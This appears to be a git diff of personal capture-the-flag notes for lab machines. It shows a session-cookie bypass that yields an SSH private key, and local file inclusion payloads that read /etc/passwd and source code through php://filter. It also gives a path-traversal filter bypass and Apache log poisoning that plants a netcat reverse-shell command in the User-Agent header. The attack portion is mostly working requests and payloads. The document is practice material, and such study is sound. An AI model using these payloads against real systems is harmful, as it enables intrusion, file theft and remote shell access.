@@ -50,7 +50,7 @@ ________________________________________________________________________________
 drwxr-xr-x    2 0        0            4096 Jun 18  2021 .
 drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
 226 Directory send OK.
-
+mrrobot.php
 Some ftp has a file like that (-) 
 FTP> get./-
 
@@ -103,10 +103,39 @@ What if SessionToken is anything.
 #curl "http://overpass.thm/admin/" --cookie "SessionToken=anything" ( we get id_rsa private key )
 ______________________________________________________________________________________________________________________________
 
+LFI vul
+--------
 http://dev.team.thm/script.php?page=teamshare.php (normal site)
 
-?page= (page parameter has directory traversal vul)
+?page= 
 http://dev.team.thm/script.php?page=../../../../../../etc/passwd
 http://dev.team.thm/script.php?page=/etc/ssh/sshd_config (to get private key)
+
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobots.php (normal site)
+
+(LFI is behind the directory not behind the view parameter)
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//etc/passwd 
+
+In order to read the source code of mrrobots.php use php://filter wrapper
+http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
+http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
+
+if(isset($_GET["view"])){
+        if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing'))
+
+it should not contain ../..
+it should contain /var/www/html/development_testing
+We can bypass the path traversal protection by replacing ../.. with .././.., as follows: 
+
+GET /test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log 
+
+Intercept with the burpsuite and inject netcat payload in php exec in User-Agent
+----------------------------------------------------------------------------------
+User-Agent: <?php exec('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.52.17 1234 >/tmp/f')?>
+
+After that don't forget to close the foxyproxy and refresh the page again to get reverse shell.
+
+
+
 
 
